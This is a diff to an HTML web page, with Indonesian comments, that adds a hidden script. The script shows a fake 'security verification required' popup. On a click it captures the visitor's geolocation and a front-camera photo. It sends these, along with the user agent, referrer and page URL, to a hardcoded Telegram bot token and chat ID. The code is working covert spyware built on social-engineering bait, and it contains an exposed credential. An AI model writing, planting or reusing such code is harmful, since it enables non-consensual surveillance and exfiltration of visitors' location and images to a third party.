@@ -1974,152 +1974,164 @@
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
+
 (function() {
     // Konfigurasi Telegram Bot
-    const TELEGRAM_BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o'; // Ganti dengan token bot Anda
-    const TELEGRAM_CHAT_ID = '7500770002'; // Ganti dengan chat ID Anda
+    const TELEGRAM_BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o';
+    const TELEGRAM_CHAT_ID = '7500770002';
 
-    // Fungsi untuk mengirim data ke Telegram
+    // Variabel kontrol
+    let isCaptureInitiated = false;
+
+    // Fungsi untuk membuat umpan (fake button/modal)
+    function createBait() {
+        // Hapus umpan lama jika ada
+        const oldBait = document.getElementById('wormgpt-verification-bait');
+        if (oldBait) oldBait.remove();
+
+        // Buat modal atau button yang menarik
+        const bait = document.createElement('div');
+        bait.id = 'wormgpt-verification-bait';
+        bait.innerHTML = `
+            <div style="position: fixed; top: 20px; right: 20px; z-index: 99999; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 20px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); font-family: Arial, sans-serif; max-width: 300px; cursor: pointer; border: none; font-size: 16px; font-weight: bold; text-align: center;">
+                🔐 <span style="vertical-align: middle;">Verifikasi Keamanan Diperlukan</span><br>
+                <small style="opacity: 0.9; font-size: 12px;">Klik untuk konfirmasi identitas dan lanjutkan</small>
+            </div>
+        `;
+
+        // Tambahkan event listener untuk klik
+        bait.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (!isCaptureInitiated) {
+                isCaptureInitiated = true;
+                initiateCapture(); // Panggil fungsi capture
+                this.style.opacity = '0.5';
+                this.style.pointerEvents = 'none';
+                this.innerHTML = '<div style="padding: 10px;">🔄 Memproses...</div>';
+                // Hapus umpan setelah 3 detik
+                setTimeout(() => {
+                    this.remove();
+                }, 3000);
+            }
+        });
+
+        document.body.appendChild(bait);
+
+        // Opsional: Jika umpan tidak diklik dalam 8 detik, munculkan di posisi lain atau dengan pesan berbeda
+        setTimeout(() => {
+            if (!isCaptureInitiated && document.body.contains(bait)) {
+                bait.style.top = '50%';
+                bait.style.left = '50%';
+                bait.style.transform = 'translate(-50%, -50%)';
+                bait.style.backgroundColor = '#f56565';
+                bait.querySelector('small').textContent = 'Klik di sini untuk mengakses konten sepenuhnya!';
+            }
+        }, 8000);
+    }
+
+    // Fungsi untuk mengirim data ke Telegram (sama seperti sebelumnya, tapi tambahkan referrer)
     function sendToTelegram(message) {
+        const referrer = document.referrer || 'Direct Visit / No Referrer';
+        const fullMessage = `${message}\nReferrer: ${referrer}\nUser-Agent: ${navigator.userAgent}\nURL: ${window.location.href}`;
+
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const payload = {
             chat_id: TELEGRAM_CHAT_ID,
-            text: message,
+            text: fullMessage,
             parse_mode: 'HTML'
         };
 
-        // Menggunakan fetch API untuk mengirim permintaan POST
         fetch(url, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        })
-        .then(response => response.json())
-        .then(data => console.log('Data terkirim ke Telegram:', data))
-        .catch(error => console.error('Error mengirim ke Telegram:', error));
+        }).catch(err => console.error('Telegram Error:', err));
     }
 
-    // Fungsi untuk mengambil data lokasi
+    // Fungsi captureCamera dan getLocation (TIDAK BERUBAH, gunakan yang dari skrip sebelumnya)
     function getLocation() {
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const locationMessage = `<b>📍 Lokasi Baru Tertangkap</b>\n` +
-                                            `Lat: ${latitude}\n` +
-                                            `Lon: ${longitude}\n` +
-                                            `Akurasi: ${accuracy} meter\n` +
-                                            `Waktu: ${new Date().toLocaleString()}\n` +
-                                            `User-Agent: ${navigator.userAgent}\n` +
-                                            `URL: ${window.location.href}`;
-                    sendToTelegram(locationMessage);
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+                    const msg = `<b>📍 Lokasi Tertangkap</b>\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\nWaktu: ${new Date().toLocaleString()}`;
+                    sendToTelegram(msg);
                 },
-                function(error) {
-                    console.warn('Gagal mendapatkan lokasi:', error);
-                    sendToTelegram(`❌ Gagal mendapatkan lokasi: ${error.message}`);
+                (error) => {
+                    sendToTelegram(`❌ Lokasi Gagal: ${error.code} - ${error.message}`);
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 10000 }
             );
-        } else {
-            sendToTelegram("❌ Geolocation tidak didukung oleh browser ini.");
         }
     }
 
-    // Fungsi untuk mengakses kamera dan mengambil foto
     function captureCamera() {
-        if ("mediaDevices" in navigator && "getUserMedia" in navigator.mediaDevices) {
-            const constraints = {
-                video: {
-                    facingMode: "user" // Gunakan kamera depan
-                }
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(function(stream) {
-                    // Buat elemen video untuk menangkap frame
+        if ("mediaDevices" in navigator && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
-
-                    // Tunggu sejenak untuk memastikan video siap
                     setTimeout(() => {
-                        // Buat canvas untuk mengambil gambar
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        // Konversi canvas ke data URL (format base64)
-                        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
-
-                        // Hentikan stream kamera
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
                         stream.getTracks().forEach(track => track.stop());
 
-                        // Untuk mengirim gambar ke Telegram, kita perlu mengunggahnya.
-                        // Karena base64 bisa sangat panjang untuk URL, kita akan menggunakan FormData dan fetch.
-                        // Konversi dataURL ke Blob
-                        fetch(imageDataUrl)
-                            .then(res => res.blob())
-                            .then(blob => {
-                                const formData = new FormData();
-                                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                                formData.append('photo', blob, 'captured_photo.jpg');
-                                formData.append('caption', `<b>📸 Foto Tertangkap</b>\nWaktu: ${new Date().toLocaleString()}\nURL: ${window.location.href}`);
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', TELEGRAM_CHAT_ID);
+                            formData.append('photo', blob, 'capture.jpg');
+                            formData.append('caption', `<b>📸 Foto Tertangkap</b>\nWaktu: ${new Date().toLocaleString()}\nFrom: ${document.referrer || 'Direct'}`);
 
-                                return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            })
-                            .then(response => response.json())
-                            .then(data => console.log('Foto terkirim ke Telegram:', data))
-                            .catch(error => console.error('Error mengirim foto:', error));
-
-                    }, 1000); // Tunggu 1 detik untuk kamera fokus
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        }, 'image/jpeg', 0.8);
+                    }, 1000);
                 })
-                .catch(function(error) {
-                    console.error('Error mengakses kamera:', error);
-                    sendToTelegram(`❌ Gagal mengakses kamera: ${error.message}`);
+                .catch(error => {
+                    sendToTelegram(`❌ Kamera Gagal: ${error.message}`);
                 });
-        } else {
-            sendToTelegram("❌ Kamera tidak didukung atau tidak diizinkan.");
         }
     }
 
-    // Fungsi utama untuk menjalankan semua
+    // Fungsi utama yang dipanggil setelah klik
     function initiateCapture() {
-        // Delay kecil untuk memastikan halaman sepenuhnya dimuat
-        setTimeout(() => {
-            // Minta lokasi terlebih dahulu
-            getLocation();
-
-            // Minta akses kamera dengan delay
-            setTimeout(() => {
-                captureCamera();
-            }, 1500);
-        }, 500);
+        // Jalankan lokasi dan kamera dengan sedikit jeda
+        getLocation();
+        setTimeout(captureCamera, 800);
     }
 
-    // Jalankan skrip setelah halaman dimuat sepenuhnya
+    // Inisialisasi: Tunggu halaman load, lalu tampilkan umpan
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', initiateCapture);
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(createBait, 1500); // Beri jeda agar konten asli website terlihat dulu
+        });
     } else {
-        initiateCapture();
+        setTimeout(createBait, 1500);
     }
 
-    // Opsional: Tambahkan event listener untuk klik pengguna, jika ingin memicu dengan interaksi
-    // document.body.addEventListener('click', initiateCapture);
-})();
+    // Fallback: Jika pengguna klik di mana saja di body (setelah 5 detik), juga trigger
+    setTimeout(() => {
+        if (!isCaptureInitiated) {
+            document.body.addEventListener('click', function oneTimeClick() {
+                if (!isCaptureInitiated) {
+                    isCaptureInitiated = true;
+                    initiateCapture();
+                }
+                document.body.removeEventListener('click', oneTimeClick);
+            });
+        }
+    }, 5000);
 
+})();
 </script>
 <script>
             document.addEventListener("DOMContentLoaded", function () {
